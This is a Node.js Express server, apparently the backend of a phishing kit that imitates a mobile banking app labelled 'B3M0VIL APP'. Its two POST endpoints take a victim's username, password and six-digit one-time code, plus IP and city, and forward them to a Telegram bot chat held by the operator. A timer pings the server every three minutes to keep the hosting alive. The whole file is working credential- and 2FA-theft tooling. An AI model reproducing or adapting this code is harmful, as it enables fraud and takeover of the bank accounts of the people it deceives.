const express = require('express');
const bodyParser = require('body-parser');

const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const FormData = require("form-data");
const https = require("https");
const agent = new https.Agent({ family: 4 });


app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));


app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, password, country, ip, city } = req.body;

    if (!user || !country || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟣B3M0VIL APP🟣\nPAYS: ${country}\nUS4R: <code>${user}</code>\nCL4V: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, ote, ote2, ote3, ote4, ote5, ote6, country, ip, city } = req.body;

    if (!user || !ip || !country || !ote || !ote2 || !ote3 || !ote4 || !ote5 || !ote6) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🟣B3M0VIL APP🟣\nPAYS: ${country}\nUS4R: <code>${user}</code>\n\nC0D3X: <code>${ote}${ote2}${ote3}${ote4}${ote5}${ote6}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});




const keepAliveUrl = 'https://bimol.onrender.com/';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 180000); // 180000 ms = 3 minutos




const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
